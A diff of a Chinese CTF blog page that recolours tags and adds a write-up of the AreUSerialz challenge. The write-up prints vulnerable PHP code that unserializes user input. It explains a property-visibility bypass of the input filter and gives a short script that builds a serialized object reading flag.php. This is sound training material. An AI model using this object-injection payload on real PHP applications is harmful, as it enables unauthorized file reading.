@@ -172,12 +172,12 @@
             
             <span class="tag">
                 
-                <a href="/tags/ctf/" style="color: #00a596">ctf</a>
+                <a href="/tags/ctf/" style="color: #03a9f4">ctf</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/web/" style="color: #ff7d73">web</a>
+                <a href="/tags/web/" style="color: #00bcd4">web</a>
             </span>
             
         </span>
@@ -500,7 +500,98 @@ if (isset($_GET[&#39;gg&#39;]) &amp;&amp; isset($_GET[&#39;id&#39;])) &#123;
 post传入
 passwd=1234567q
 </code></pre>
-<h3 id="2023-6-8-网鼎杯-2020-青龙组-AreUSerialz"><a href="#2023-6-8-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="2023.6.8 [网鼎杯 2020 青龙组]AreUSerialz"></a>2023.6.8 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz">[网鼎杯 2020 青龙组]AreUSerialz</a></h3>
+<h3 id="2023-6-8-网鼎杯-2020-青龙组-AreUSerialz"><a href="#2023-6-8-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="2023.6.8 [网鼎杯 2020 青龙组]AreUSerialz"></a>2023.6.8 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz">[网鼎杯 2020 青龙组]AreUSerialz</a></h3><p>一道比较简单的php反序列化题目，直接给出了代码</p>
+<pre><code class="php">&lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler &#123;
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() &#123;
+        $op = &quot;1&quot;;
+        $filename = &quot;/tmp/tmpfile&quot;;
+        $content = &quot;Hello World!&quot;;
+        $this-&gt;process();
+    &#125;
+
+    public function process() &#123;
+        if($this-&gt;op == &quot;1&quot;) &#123;
+            $this-&gt;write();
+        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;
+            $res = $this-&gt;read();
+            $this-&gt;output($res);
+        &#125; else &#123;
+            $this-&gt;output(&quot;Bad Hacker!&quot;);
+        &#125;
+    &#125;
+
+    private function write() &#123;
+        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;
+            if(strlen((string)$this-&gt;content) &gt; 100) &#123;
+                $this-&gt;output(&quot;Too long!&quot;);
+                die();
+            &#125;
+            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
+            if($res) $this-&gt;output(&quot;Successful!&quot;);
+            else $this-&gt;output(&quot;Failed!&quot;);
+        &#125; else &#123;
+            $this-&gt;output(&quot;Failed!&quot;);
+        &#125;
+    &#125;
+
+    private function read() &#123;
+        $res = &quot;&quot;;
+        if(isset($this-&gt;filename)) &#123;
+            $res = file_get_contents($this-&gt;filename);
+        &#125;
+        return $res;
+    &#125;
+
+    private function output($s) &#123;
+        echo &quot;[Result]: &lt;br&gt;&quot;;
+        echo $s;
+    &#125;
+
+    function __destruct() &#123;
+        if($this-&gt;op === &quot;2&quot;)
+            $this-&gt;op = &quot;1&quot;;
+        $this-&gt;content = &quot;&quot;;
+        $this-&gt;process();
+    &#125;
+
+&#125;
+
+function is_valid($s) &#123;
+    for($i = 0; $i &lt; strlen($s); $i++)
+        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+            return false;
+    return true;
+&#125;
+
+if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
+    $str = (string)$_GET[&#39;str&#39;];
+    if(is_valid($str)) &#123;
+        $obj = unserialize($str);
+    &#125;
+
+&#125;
+</code></pre>
+<p>需要注意的就是class中的变量是protectde，反序列化后会出现不可见字符，从而导致is_valid函数返回false，所以这里利用php7.1+的一个特性，对属性类型不敏感，本地序列化时只需改成public就能绕过</p>
+<pre><code class="php">&lt;?php
+class FileHandler &#123;
+    public $op=2;
+    public $filename=&quot;flag.php&quot;;
+&#125;
+echo serialize(new FileHandler);
+</code></pre>
+<p>找个环境运行一下即可得到str的值</p>
+<h3 id="2023-6-9-SUCTF-2019-CheckIn"><a href="#2023-6-9-SUCTF-2019-CheckIn" class="headerlink" title="2023.6.9 [SUCTF 2019]CheckIn"></a>2023.6.9 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn">[SUCTF 2019]CheckIn</a></h3>
     </div>
     
     
